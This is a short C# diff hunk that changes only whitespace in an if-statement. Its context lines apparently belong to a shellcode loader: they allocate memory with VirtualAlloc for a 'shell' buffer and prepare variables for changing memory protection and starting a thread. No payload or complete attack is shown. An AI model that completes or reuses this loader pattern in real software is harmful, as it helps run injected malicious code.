@@ -69,7 +69,7 @@ class Program
 
             IntPtr mem = VirtualAlloc(IntPtr.Zero, (IntPtr)(shell.Length*2), AllocationType.COMMIT, Protection.PAGE_READWRITE);
 
-            if( mem != IntPtr.Zero )
+            if(mem != IntPtr.Zero)
             {
                 uint oldProt = 0;
                 uint threadId = 0;
